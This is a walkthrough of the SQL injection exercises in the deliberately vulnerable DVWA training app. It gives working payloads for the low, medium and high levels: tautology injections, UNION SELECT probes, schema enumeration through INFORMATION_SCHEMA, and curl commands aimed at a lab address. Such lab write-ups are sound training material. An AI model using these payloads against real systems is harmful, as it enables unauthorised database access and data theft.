# Difficulty - Low

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection/Sources/low.php)


The classic `' or 1 = '1` seems to work:

![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection/Pictures/1.png)


The union should be like that `' UNION ALL SELECT '1','2`:

![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection/Pictures/2.png)

Now we can esacalate:
`' union  (SELECT 1, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES)  #`:

![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection/Pictures/3.png)



# Difficulty - Medium

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection/Sources/medium.php)

This time I'll use the curl command.
A basic curl is : `curl 'http://10.10.189.172/vulnerabilities/sqli/#'  -H 'Cookie: PHPSESSID=tdlvlur0sis03jh8gcah4tr2i5; security=medium' --data-raw 'id=1&Submit=Submit'`

The union is possible with this command: 
`curl 'http://10.10.189.172/vulnerabilities/sqli/#'  -H 'Cookie: PHPSESSID=tdlvlur0sis03jh8gcah4tr2i5; security=medium' --data-raw 'id=1 UNION SELECT ALL 1,2 # &Submit=Submit'`


![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection/Pictures/4.png)


Now we can esacalate:

`curl 'http://10.10.189.172/vulnerabilities/sqli/#'  -H 'Cookie: PHPSESSID=tdlvlur0sis03jh8gcah4tr2i5; security=medium' --data-raw 'id=1 UNION (SELECT 1, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES) # &Submit=Submit'`

![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection/Pictures/5.png)


We can do this in browser either (by modifying the html) for a nicer output format:


![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection/Pictures/6.jpg)


# Difficulty - High

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection/Sources/high.php)

The classic `' or 1 = '1` seems to work here too. (without any error)

Perform a union select like that `0' union select all 1, '2`.

It works, so let's try replacing `1` with something interesting like this:

`0' union select all (select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES ), '2`.

![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection/Pictures/7.png)


# Difficulty - Impossible

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/SQL%20Injection/Sources/impossible.php)
